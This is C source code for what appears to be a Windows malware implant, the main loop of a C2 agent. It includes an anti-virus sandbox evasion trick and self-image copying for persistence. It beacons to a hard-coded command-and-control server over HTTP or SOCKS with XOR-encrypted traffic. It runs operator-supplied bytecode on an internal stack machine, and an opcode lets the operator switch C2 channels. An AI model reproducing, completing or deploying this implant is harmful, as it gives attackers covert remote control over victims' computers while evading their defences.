#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char** argv);
#include "datatypes.h"
#include "utils/crc32.h"
#include "commands.h"
#include "c2.h"
#include "crypter.h"
#define UUID NULL
#define SOCKS_SECRET "VERYSECRET1337"
const char* dlls[] = {"advapi32.dll", "gdi32.dll", "kernel32.dll", "msvcrt.dll", "ole32.dll", "shlwapi.dll", "user32.dll", "wininet.dll", "ws2_32.dll"};

int main(int argc, char** argv){
    char* sand = calloc(100*100000, 1); //allocate big memory to bypass av sandboxes
    free(sand);
    if(imageBase == NULL || argc == 69420){
        if(imageBase == NULL)
            imageBase = GetModuleHandleA(NULL);
        deltaIB = (unsigned long long)&imageBase - (unsigned long long)imageBase;
	    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;
	    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)imageBase + dosHeaders->e_lfanew);
	    dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;
        
	    revival = VirtualAlloc(NULL, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        memcpy(revival, imageBase, dllImageSize);
        if(argc == 69420){
            for(int i=0;i<(sizeof(dlls)/sizeof(char*));i++)
                if(GetModuleHandleA(dlls[i]) == NULL) LoadLibraryA(dlls[i]);
            isChild = 1;
        }else{
            AddVectoredExceptionHandler(1, hand);
        }
    }
    
    C2* conn;
    char uuid[50] = {0};
    if(UUID == NULL){
        char tmp[MAX_PATH] = {0};
        GetTempPathA(MAX_PATH, tmp);
        strtok(tmp, "\\");
        strtok(NULL, "\\");
        strcpy(uuid, strtok(NULL, "\\"));
    }else{
        strcpy(uuid, UUID);
    }
    while(1){
        //conn = newC2(SOCKS, uuid, SOCKS_SECRET, "192.168.1.110", 6968, 1000);
        conn = newC2(HTTP, uuid, "http://192.168.1.110:1234/document/", 1000);
        if(conn == NULL){
            Sleep(60000);
            continue;
        }
        addRxEnc(conn, 1, xor);
        addTxEnc(conn, 1, xor);
        while(1){
            VMstate state = recvC2(*conn);
            if(state.isize == -1){
                cleanC2(*conn);
                free(conn);
                break;
            }else if(state.isize == -2){
                continue;
            }
            int size = state.isize;
            unsigned char* instructs = state.instructs;
            unsigned char* ip = instructs;
            
            unsigned char* data = state.data;
            unsigned char* sp = data;
            
            if(crc32(0, instructs+4, size-4) != popint(&ip)){ //exclude actual checksum from compute
                printf("error! checksum fail!\n");
                goto end;
            }

            while((ip-size) < instructs){ //is there still stuff on stack
                if(sp > data){
                    printf("error! stack underflow!\n");
                    goto end;
                }
                unsigned int mnem = popint(&ip);
                if(mnem == PUSHINT){
                    pushint(popint(&ip), &sp);
                }else if(mnem == PUSHSTR){
                    String str = popstr(&ip);
                    pushstr(str, &sp);
                    fs(str);
                }else if(mnem == EXIT){
                    free(data-BACKLOG);
                    free(instructs);
                    goto fin;
                }else if(mnem == POPINT){
                    char data[50] = {0};
                    sprintf(data, "[INT]: %d", popint(&sp));
                    sendC2(*conn, data, strlen(data));
                }else if(mnem == PRINT){
                    String str = popstr(&sp);
                    pushint(str.len, &sp);
                    sendC2(*conn, str.data, str.len);
                    fs(str);
                }else if(mnem == SWAP_C2){
                    void** tmprx = conn->cryptRx;
                    void** tmptx = conn->cryptTx;
                    unsigned int code = popint(&sp);
                    
                    if(code == SOCKS){
                        String ip = popstr(&sp);
                        unsigned int port = popint(&sp);
                        unsigned int poll = popint(&sp);
                        C2* conn2 = newC2(SOCKS, UUID, SOCKS_SECRET, ip.data, port, poll);
                        if(conn2 != NULL){
                            cleanC2(*conn);
                            memcpy(conn, conn2, sizeof(C2));
                            free(conn2);
                        }
                        fs(ip);
                    }else if(code == HTTP){
                        String ip = popstr(&sp);
                        unsigned int poll = popint(&sp);
                        C2* conn2 = newC2(HTTP, UUID, ip.data, poll);
                        if(conn2 != NULL){
                            cleanC2(*conn);
                            memcpy(conn, conn2, sizeof(C2));
                            free(conn2);
                        }
                        fs(ip);
                    }
                    conn->cryptRx = tmprx;
                    conn->cryptTx = tmptx;
                }else if(parse(mnem, &sp, conn)){
                    printf("error! invalid opcode! 0x%x\n", mnem);
                    goto end;
                }
            }
        end:
            free(data-BACKLOG);
            free(instructs);
        }
    }
fin:
    cleanC2(*conn);
    free(conn);
}
